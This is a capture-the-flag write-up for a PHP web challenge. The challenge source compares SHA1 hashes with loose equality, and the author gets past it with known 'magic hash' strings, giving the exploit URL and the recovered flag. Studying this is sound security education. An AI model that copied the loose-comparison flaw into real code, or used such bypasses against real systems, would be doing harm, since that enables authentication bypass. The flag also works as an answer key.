@@ -1,0 +1,44 @@
+Web challenge sourcecode
+
+
+Scanning URL http://143.198.224.219:20000 reveals only one page
+
+Website seems broken with a blang page, but we can get the source code:
+
+<?php
+if (isset($_GET['hash'])) {
+    if ($_GET['hash'] === "10932435112") {
+        die('Not so easy mate.');
+    }
+
+    $hash = sha1($_GET['hash']);
+    $target = sha1(10932435112);
+    if($hash == $target) {
+        include('flag.php');
+        print $flag;
+    } else {
+        print "OFPPT-CTF{not-the-one}";
+    }
+} else {
+    show_source(__FILE__);
+}
+
+?>
+
+We can use the hash URL parameter to reveal the full source but what is the good password?
+
+We know it's SHA1 and must be 10932435112.
+
+We try to use magic hashes, which are hash collisions specific to the PHP due to type juggling:
+https://github.com/spaze/hashes/blob/master/sha1.md
+
+aaroZmOk:0e66507019969427134894567494305185566735
+aaK1STfY:0e76658526655756207688271159624026011393
+aaO8zKZF:0e89257456677279068558073954252716165668
+
+Using the first one of the list:
+http://143.198.224.219:20000/?hash=aaroZmOk
+
+Website returns OFPPT-CTF{typ3_juggl1ng_1n_php}
+
+Flag: OFPPT-CTF{typ3_juggl1ng_1n_php}
